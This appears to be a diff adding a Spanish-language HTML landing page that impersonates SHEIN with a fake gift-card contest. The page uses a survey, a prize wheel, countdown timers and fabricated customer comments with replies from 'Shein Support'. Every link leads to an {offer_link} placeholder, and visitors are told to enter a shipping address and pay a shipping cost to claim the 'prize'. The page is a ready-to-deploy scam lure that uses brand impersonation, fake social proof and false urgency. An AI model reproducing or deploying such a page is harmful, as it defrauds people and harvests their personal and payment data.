@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<base href=".">
+	
+
+	<title>CONCURSO DE FEBRERO | SHEIN</title>
+	<meta name="description" content="SHEIN">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" href="./index_files/style.css">
+	<link rel="stylesheet" href="./index_files/media.css">
+	<link rel="icon" href="./index_files/221795668_10159746504359090_4962850570781913229_n.jpg" type="image/x-icon">	
+	
+	<style>
+  /* Basic styling for the navigation bar */
+  nav {
+    background: linear-gradient(to left, #009505, #00D4FE);
+    overflow: hidden;
+  }
+
+  nav a {
+    float: left;
+    display: block;
+    color: white;
+    text-align: center;
+    padding: 14px 20px;
+    text-decoration: none;
+  }
+
+  nav a:hover {
+    background-color: #FFC600;
+    color: black;
+  }
+</style>
+	
+	<nav>
+  <a href="{offer_link}"><b><strong>Home</strong></b></a>
+  <a href="{offer_link}"><b><strong>Support</strong></b></a>
+  <a href="{offer_link}"><b><strong>Services</strong></b></a>
+  <a href="{offer_link}"><b><strong>About</strong></b></a>
+  <a href="{offer_link}"><b><strong>Contact</strong></b></a>
+	</nav>
+  
+</head>
+
+<body>
+	<header class="header" style="z-index: 1000000;">
+		<div class="container">
+			<img class="header__logo" src="./index_files/logo.svg" alt="logo">
+		</div>
+	</header>
+	<div class="notifications">
+		<div class="notification notification_showed" style="display: none; animation: 1s ease 0s 1 normal none running fadeOut;">
+			<div class="notification__wrapper">
+				<div class="notification__body">
+					<img class="notification__img" src="./index_files/cards.png">
+					<div class="notification__info">
+						<div class="notification__subtitle">
+							<b class="notification__name">Aletta</b>
+							<span class="notification__city">desde Spain</span>
+						  </div>
+						  <div class="notification__title">
+							GANÓ una tarjeta de regalo de Shein
+						  </div>
+						  <div class="notification__subtitle">
+							<span>
+							  hace 37 segundos
+							</span>
+							<img class="notification__checkmark" src="./index_files/notification-ok.svg" alt="foto">
+						  </div>
+					</div>
+				</div>
+				<button class="notification__close"  >
+					<img class="notification__closeIcon" src="./index_files/notifications-close.svg" height="15px" width="15px" alt="photo">
+				</button>
+			</div>
+		</div>
+	</div>
+	<div class="container">
+		<div class="wrapper">
+			<section class="loader">
+				<div class="container">
+				  <h2 class="loader__title">Por favor espera, estamos verificando tus respuestas...</h2>
+				  <div class="loader__spinner"></div>
+				  <ul class="loader__list list-reset">
+					<li class="loader__item loader__item-1">¡Ya has respondido todas las preguntas!</li>
+					<li class="loader__item loader__item-2">No hay encuesta en tu dirección IP.</li>
+					<li class="loader__item loader__item-3">¡Los regalos todavía están disponibles!</li>
+				  </ul>
+				</div>
+			  </section>
+			<section class="last">
+				<div class="container">
+					<div class="last__card">
+						<div class="hide">
+							<p class="last__text">Shein quiere agradecerte por tu lealtad hoy, ¡así que te ofrecemos recompensas especiales!</p>
+							<div class="last__title-block">
+							  <h2 class="last__title">¡Gira la ruleta<br> y gana tu premio especial!</h2>
+							</div>
+							<div class="last__spinner">
+							  <img class="last__img" src="./index_files/spin.png" alt="rueda">
+							  <img class="last__img-2" src="./index_files/spin-wheel.webp" alt="tocadiscos">
+							</div>
+						  </div>
+						<div class="show">
+							<p class="show__text">Enhorabuena, ¡has ganado!</p>
+							<p class="show__text-2">La tarjeta regalo Shein estaba reservada para ti durante 5 minutos.</p>
+							<ol class="show__list list-reset">
+								<li class="show__item"><span>1.</span> Haz clic en el botón 'CONTINUAR' para reclamar tu premio.</li>
+								<li class="show__item"><span>2.</span> Ingresa la información correcta en la siguiente página para reclamar tu premio.</li>
+							</ol>
+							  <p class="show__text-3"><span>Importante:</span> ¡Date prisa, las cantidades son limitadas!</p>
+							  <p class="show__text-4">Solo te quedan <span id="timer2"></span></p>
+							  <div class="show__block">
+								<div class="show__img-block">
+								  <img class="show__img" src="./index_files/cards.png" alt="cartas">
+								  <p class="show__text-3"><span>¡Date prisa, la cantidad es limitada!</span></p>
+								</div>
+								<div class="show__text-block">
+								  <p class="show__text-5">*** ¿Cómo reclamo mi premio? Ingresa tu dirección de envío en la siguiente página. El costo de envío dependerá del destino de entrega y las tarifas de tu servicio de entrega.</p>
+								  <a href="{offer_link}" class="show__btn btn-reset" id="startBtn" onclick="waitOn();openUrl()">CONTINUAR</a>
+								</div>
+							  </div>
+						</div>
+					</div>
+				</div>
+
+				<div class="last__card">
+					<h2 class="comments__title">Comentarios</h2>
+					<div class="comments">
+						<!-- <p class="others-say">Read what others have to say about our program:</p> -->
+						<div class="sorting-box">
+							<p>136 comentarios</p>
+							<div class="inner-sorting-box">
+								<svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="circle-notch" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="display: none;">
+									<path fill="#a6adb7" d="M288 39.056v16.659c0 10.804 7.281 20.159 17.686 23.066C383.204 100.434 440 171.518 440 256c0 101.689-82.295 184-184 184-101.689 0-184-82.295-184-184 0-84.47 56.786-155.564 134.312-177.219C216.719 75.874 224 66.517 224 55.712V39.064c0-15.709-14.834-27.153-30.046-23.234C86.603 43.482 7.394 141.206 8.003 257.332c.72 137.052 111.477 246.956 248.531 246.667C393.255 503.711 504 392.788 504 256c0-115.633-79.14-212.779-186.211-240.236C302.678 11.889 288 23.456 288 39.056z">
+									</path>
+								</svg>
+								<span>Ordenado por Más recientes</span>
+						
+							</div>
+						</div>
+						<div class="add-comment active">
+							<img src="./index_files/user.jpg" alt="User">
+							<textarea placeholder="Añadir un comentario..."></textarea>
+							<div class="comment-button-box">
+								<div class="comment-button-left">
+									<input id="checkbox" type="checkbox" name="checkbox">
+									<label for="checkbox">También publicar en Facebook</label>
+<p>Escribe <span class="keys-left">6</span> caracteres más para publicar en Facebook</p>
+								</div>
+								<div class="comment-button-right">
+									<button disabled="" class="disabled"  >Inicia sesión para publicar</button>
+								</div>
+							</div>
+						</div>
+						<div class="main-comments">
+
+
+
+
+							<div class="comments-footer">
+								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
+									<path fill="#2563eb" d="M400 32H48A48 48 0 0 0 0 80v352a48 48 0 0 0 48 48h137.25V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.27c-30.81 0-40.42 19.12-40.42 38.73V256h68.78l-11 71.69h-57.78V480H400a48 48 0 0 0 48-48V80a48 48 0 0 0-48-48z">
+									</path>
+								</svg>
+								<a href="{offer_link}" target="_blank">Plugin de Comentarios de Facebook</a>
+							</div>
+							<div class="comment sort-coms" data-order="1" data-likes="3" style="">
+								<a class="comment-user-img" target="_blank"><img src="./index_files/69816221_2554263714806943_9028109165582614528_n.jpg" width="48" height="48" alt="Christien"></a>
+								<a target="_blank" class="comment-user-name"><span>Christien</span></a>
+								<p class="comment-text"> ¡Increíble! Recibí mi tarjeta regalo Shein ayer, ¡ahora voy a hacer feliz a mi cónyuge con nuevas compras! Gracias</p>
+								<div class="comment-image"><img src="./index_files/proof1.1.jpeg" alt="Image"></div>
+								<div class="comment-meta">
+									<button  >Me gusta</button><span> . </span>
+									<button  >Responder</button><span> . </span>
+									<span class="total-likes">3</span><span> . </span>
+									<span class="comment-age comments__date">15.05.2024</span>
+								</div>
+							</div>
+							<div class="comment sort-coms" data-order="2" data-likes="8" style="display: block;">
+								<a class="comment-user-img" target="_blank"><img src="./index_files/20604570_10213232827325795_456622192175201285_n.jpg" width="48" height="48" alt="Cezanne"></a>
+								<a target="_blank" class="comment-user-name"><span>Cezanne</span></a>
+								<p class="comment-text">¡Las emociones están a flor de piel! ¡La tarjeta regalo Shein es increíble! Gracias por semejante regalo, ¡es una delicia!</p>
+								<div class="comment-image"><img src="./index_files/proof2.jpeg" alt="Image"></div>
+								<div class="comment-meta">
+									<button  >Me gusta</button><span> . </span>
+									<button  >Responder</button><span> . </span>
+									<span class="total-likes">8</span><span> . </span>
+									<span class="comment-age comments__date">15.05.2024</span>
+								</div>
+								<div class="comment">
+									<a class="comment-user-img" target="_blank"><img src="./index_files/221795668_10159746504359090_4962850570781913229_n.jpg" width="48" height="48" alt="Shein Support"></a>
+									<a target="_blank" class="comment-user-name"><span>Shein Support</span> <svg fill="#3b82f6" aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+											<path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z">
+											</path>
+										</svg></a>
+									<p class="comment-text"> ¡Nos alegramos de que seas uno de los que lo ha conseguido! Úsalo con gusto!</p>
+									<div class="comment-meta">
+										<button  >Me gusta</button><span> . </span>
+										<button  >Responder</button><span> . </span>
+										<span class="total-likes">10</span><span> . </span>
+										<span class="comment-age comments__date">15.05.2024</span>
+									</div>
+								</div>
+							</div>
+							<div class="comment sort-coms" data-order="3" data-likes="2" style="">
+								<a class="comment-user-img" target="_blank"><img src="./index_files/12803221_819021308208276_8878962579447481896_n.jpg" width="48" height="48" alt="Palesa"></a>
+								<a target="_blank" class="comment-user-name"><span>Palesa</span></a>
+								<p class="comment-text">He desempaquetado la tarjeta regalo de Shein que gané en el concurso, ¡no hay palabras! Hoy mismo haré el pedido con mi novia. Gracias por este regalo para mi otra mitad.</p>
+								<div class="comment-image"><img src="./index_files/proof3.1.jpeg" alt="Image"></div>
+								<div class="comment-meta">
+									<button  >Me gusta</button><span> . </span>
+									<button  >Responder</button><span> . </span>
+									<span class="total-likes">2</span><span> . </span>
+									<span class="comment-age comments__date">15.05.2024</span>
+								</div>
+								<div class="comment">
+									<a class="comment-user-img" target="_blank"><img src="./index_files/221795668_10159746504359090_4962850570781913229_n.jpg" width="48" height="48" alt="Shein Support"></a>
+									<a target="_blank" class="comment-user-name"><span>Shein Support</span> <svg fill="#3b82f6" aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+											<path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z">
+											</path>
+										</svg></a>
+									<p class="comment-text"> Le deseamos una agradable experiencia de compra.</p>
+									<div class="comment-meta">
+										<button  >Me gusta</button><span> . </span>
+										<button  >Responder</button><span> . </span>
+										<span class="total-likes">10</span><span> . </span>
+										<span class="comment-age comments__date">15.05.2024</span>
+									</div>
+								</div>
+							</div>
+							<div class="comment sort-coms" data-order="3" data-likes="2" style="">
+								<a class="comment-user-img" target="_blank"><img src="./index_files/38789930_2043705085942295_6329185397909749760_n.jpg" width="48" height="48" alt="Palesa"></a>
+								<a target="_blank" class="comment-user-name"><span>Palesa</span></a>
+								<p class="comment-text">Recibí mi tarjeta Shein, casi lloro de felicidad. Gracias por hacerme creer en los milagros.</p>
+								<div class="comment-image"><img src="./index_files/proof4.jpeg" alt="Image"></div>
+								<div class="comment-meta">
+									<button  >Me gusta</button><span> . </span>
+									<button  >Responder</button><span> . </span>
+									<span class="total-likes">2</span><span> . </span>
+									<span class="comment-age comments__date">15.05.2024</span>
+								</div>
+								<div class="comment">
+									<a class="comment-user-img" target="_blank"><img src="./index_files/221795668_10159746504359090_4962850570781913229_n.jpg" width="48" height="48" alt="Shein Support"></a>
+									<a target="_blank" class="comment-user-name"><span>Shein Support</span> <svg fill="#3b82f6" aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+											<path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z">
+											</path>
+										</svg></a>
+									<p class="comment-text">¡Gracias por confiar en mí! ¡Os deseamos a todos una experiencia de compra increíble!</p>
+									<div class="comment-meta">
+										<button  >Me gusta</button><span> . </span>
+										<button  >Responder</button><span> . </span>
+										<span class="total-likes">10</span><span> . </span>
+										<span class="comment-age comments__date">15.05.2024</span>
+									</div>
+								</div>
+							</div>
+							<div class="comment sort-coms" data-order="5" data-likes="5" style="display: block;">
+								<a class="comment-user-img" target="_blank"><img src="./index_files/241334482_10226738765361057_5228690518306479617_n.jpg" width="48" height="48" alt="Adiel"></a>
+								<a target="_blank" class="comment-user-name"><span>Adiel</span></a>
+								<p class="comment-text"> ¡Sorprendido! Tarjeta Shein: sí, mi mujer estará encantada. Gracias al organizador y al mensajero que lo entregó todo.</p>
+								<div class="comment-meta">
+									<button  >Me gusta</button><span> . </span>
+									<button  >Responder</button><span> . </span>
+									<span class="total-likes">5</span><span> . </span>
+									<span class="comment-age comments__date-2">14.05.2024</span>
+								</div>
+							
+							</div>
+							<div class="comment sort-coms" data-order="5" data-likes="5" style="display: block;">
+								<a class="comment-user-img" target="_blank"><img src="./index_files/155526665_5099662880106749_4101107736158200773_n.jpg" width="48" height="48" alt="Aziza"></a>
+								<a target="_blank" class="comment-user-name"><span>Aziza</span></a>
+								<p class="comment-text">Por fin me han entregado mi tarjeta regalo Shein ganadora y ya estoy planeando mis futuras compras con ella. Chicos, soy uno de vosotros, os deseo mucha suerte a todos.</p>
+								<div class="comment-meta">
+									<button  >Me gusta</button><span> . </span>
+									<button  >Responder</button><span> . </span>
+									<span class="total-likes">5</span><span> . </span>
+									<span class="comment-age comments__date-3">13.05.2024</span>
+								</div>
+							</div>
+							
+						</div>
+					</div>
+				</div>
+		
+
+		</section>
+		<img class="prize" src="./index_files/cards.png" alt="card">
+		<div class="modal">
+			<img class="modal__img" src="./index_files/refresh.webp" alt="imagen">
+			<p class="modal__text">¡Inténtalo de nuevo!</p>
+			<p class="modal__text-2">Por favor, inténtalo de nuevo. ¡Tienes una última oportunidad!</p>
+			<button class="modal__btn btn-reset"  >¡Vamos!</button>
+		  </div>
+		<main class="main">
+			<img class="main__img" src="./index_files/hero.png" alt="photo">
+			<p id="timerwrap">
+
+				<span id="timer"></span>
+
+			</p>
+			<p class="main__text-1">Date prisa, ¡sólo quedan  <span id="cardsAmount">141</span> Tarjetas Regalo Shein de un total de 1000!</p>
+			<button class="main__btn btn-reset survey_button startform1" data-bq="1" id="starttimer"  >INICIAR</button>
+<div class="quetions" id="quetions">
+	<div class="quetion-1">
+	  <p class="quetion-counter">Pregunta 1 de 7</p>
+	  <p class="quetion__text">
+		¿Eres residente permanente en Spain?
+	  </p>
+	  <button class="quetion__btn btn-reset"  >
+		Sí</button>
+	  <button class="quetion__btn btn-reset"  >
+		No</button>
+	</div>
+	<div class="quetion-2">
+	  <p class="quetion-counter">Pregunta 2 de 7</p>
+	  <p class="quetion__text">
+		¿Tienes más de 18 años?
+	  </p>
+	  <button class="quetion__btn btn-reset"  >
+		Sí</button>
+	  <button class="quetion__btn btn-reset"  >
+		No</button>
+	</div>
+	<div class="quetion-3">
+	  <p class="quetion-counter">Pregunta 3 de 7</p>
+	  <p class="quetion__text">
+		¿Has comprado algo con tarjetas regalo de una tienda online?
+	  </p>
+	  <button class="quetion__btn btn-reset"  >
+		Sí</button>
+	  <button class="quetion__btn btn-reset"  >
+		No</button>
+	</div>
+	<div class="quetion-4">
+	  <p class="quetion-counter">Pregunta 4 de 7</p>
+	  <p class="quetion__text">
+		¿Nuestra tienda en línea es adecuada para ti?
+	  </p>
+	  <button class="quetion__btn btn-reset"  >
+		Sí</button>
+	  <button class="quetion__btn btn-reset"  >
+		No</button>
+	</div>
+	<div class="quetion-5">
+	  <p class="quetion-counter">Pregunta 5 de 7</p>
+	  <p class="quetion__text">
+		¿Has instalado nuestra aplicación móvil en tu teléfono?
+	  </p>
+	  <button class="quetion__btn btn-reset"  >
+		Sí</button>
+	  <button class="quetion__btn btn-reset"  >
+		No</button>
+	</div>
+	<div class="quetion-6">
+	  <p class="quetion-counter">Pregunta 6 de 7</p>
+	  <p class="quetion__text">
+		¿Alguno de tus amigos ha utilizado nuestra tarjeta regalo Shein?
+	  </p>
+	  <button class="quetion__btn btn-reset"  >
+		Sí</button>
+	  <button class="quetion__btn btn-reset"  >
+		No</button>
+	</div>
+	<div class="quetion-7">
+	  <p class="quetion-counter">Pregunta 7 de 7</p>
+	  <p class="quetion__text">
+		¿Ves a menudo que mencionan nuestra tienda en las redes sociales?
+	  </p>
+	  <button class="quetion__btn btn-reset"  >
+		Sí</button>
+	  <button class="quetion__btn btn-reset"  >
+		No</button>
+	</div>
+  </div>
+
+		</main>
+		<aside class="aside">
+			<h1 class="aside__title">
+				Gana una tarjeta regalo Shein!
+			</h1>
+			<p class="aside__text-1">
+				En honor al cumpleaños de nuestra tienda, queremos hacer felices a nuestros clientes y nuevos amigos Spain regalando una Tarjeta Regalo Shein. Será perfecta como regalo para ti o para tus seres queridos. Hacemos un seguimiento cuidadoso del envío para asegurarnos de que todos los que han dejado una puja reciban su Tarjeta Regalo Shein.
+
+			</p>
+			<p class="aside__text-1">
+				Hoy, <span class="p_var-dia">15</span> <span class="p_var-mes_nombre">Mayo</span> <span class="p_var-anyo">2024</span> te invitamos a participar en este concurso.
+			</p>
+			<p class="aside__text-1">
+				
+
+				Esto es lo que tienes que hacer: responde a 7 sencillas preguntas y recibe una Tarjeta Regalo Shein gratis.
+			</p>
+			<p class="aside__text-2">
+				¡Solo tienes 2 minutos para completar la encuesta!
+			</p>
+		</aside>
+	</div>
+	</div>
+
+
+	<script src="./index_files/jquery-3.6.0.min.js.download"></script>
+	<script src="./index_files/date.js.download"></script>
+	<script src="./index_files/script.js.download" defer=""></script>
+
+
+</body></html>
